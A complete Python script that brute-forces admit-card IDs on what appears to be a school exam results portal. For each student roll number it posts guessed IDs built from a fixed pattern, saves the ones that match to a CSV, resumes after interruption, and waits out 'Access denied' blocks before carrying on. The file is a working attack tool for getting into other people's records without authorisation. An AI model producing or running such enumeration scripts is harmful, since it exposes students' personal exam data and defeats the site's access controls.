import requests
import string
import csv
import os
import time
from dotenv import load_dotenv
import json

load_dotenv()

# =========================
# CONFIG
# =========================

URL = os.getenv("URL")
SCHOOL_NO = os.getenv("SCHOOL_NO")
RESULTS_CSV = os.getenv("RESULTS_CSV")
PROGRESS_FILE = os.getenv("PROGRESS_FILE")
HEADERS = json.loads(os.getenv("HEADERS"))
START_ROLL = int(os.getenv("START_ROLL"))
END_ROLL = int(os.getenv("END_ROLL"))

required = [URL, SCHOOL_NO, RESULTS_CSV, PROGRESS_FILE]
if not all(required):
    raise ValueError("Missing environment variables")

# =========================
# SESSION
# =========================

session = requests.Session()

# =========================
# GENERATOR
# =========================


def generate_ids(roll_no, school_code):

    roll_no = str(roll_no)
    school_code = str(school_code)

    last_two_roll = roll_no[-2:]
    first_two_school = school_code[:2]

    for a in string.ascii_uppercase:
        for b in string.ascii_uppercase:
            for num in range(1, 100):

                suffix = f"{num:02d}"

                yield f"{a}{b}{last_two_roll}{first_two_school}{suffix}"


# =========================
# PROGRESS SAVE/LOAD
# =========================


def save_progress(roll_no, index):

    with open(PROGRESS_FILE, "w") as f:
        f.write(f"{roll_no},{index}")


def load_progress():

    if os.path.exists(PROGRESS_FILE):

        with open(PROGRESS_FILE, "r") as f:

            data = f.read().strip()

            if data:

                roll_no, index = data.split(",")

                return int(roll_no), int(index)

    return START_ROLL, 0


# =========================
# CSV SETUP
# =========================

if not os.path.exists(RESULTS_CSV):

    with open(RESULTS_CSV, "w", newline="", encoding="utf-8") as f:

        writer = csv.writer(f)

        writer.writerow(["Roll Number", "School Number", "Admit ID"])

# =========================
# LOAD RESUME
# =========================

resume_roll, resume_index = load_progress()

print(f"\n[RESUME] Roll: {resume_roll} | Index: {resume_index}")

# =========================
# MAIN
# =========================

for current_roll in range(resume_roll, END_ROLL + 1):

    print(f"\nChecking Roll: {current_roll}")

    found = False

    generator = generate_ids(current_roll, SCHOOL_NO)

    for index, admit_card_id in enumerate(generator):

        # Skip old progress
        if current_roll == resume_roll and index < resume_index:
            continue

        try:

            # Save progress BEFORE request
            save_progress(current_roll, index)

            payload = {
                "regno": str(current_roll),
                "sch": SCHOOL_NO,
                "admid": admit_card_id,
            }
            response = session.post(URL, data=payload, headers=HEADERS)

            html = response.text

            if "Access denied" in html:
                print("[BLOCKED]")
                time.sleep(60)
                continue

            # FAILURE CHECK

            if f"{current_roll}" in html:

                print(f"[FOUND] {current_roll} -> {admit_card_id}")

                # SAVE VALID RESULT
                with open(RESULTS_CSV, "a", newline="", encoding="utf-8") as f:

                    writer = csv.writer(f)

                    writer.writerow([current_roll, SCHOOL_NO, admit_card_id])

                found = True

                break
            else:
                print(f"[X] {admit_card_id}")

        except Exception as e:

            print(f"[ERROR] {e}")

            time.sleep(2)

    # Reset resume index
    resume_index = 0

    if not found:
        print("No valid admit ID found.")

# =========================
# CLEANUP
# =========================

if os.path.exists(PROGRESS_FILE):
    os.remove(PROGRESS_FILE)

print("\nFinished.")
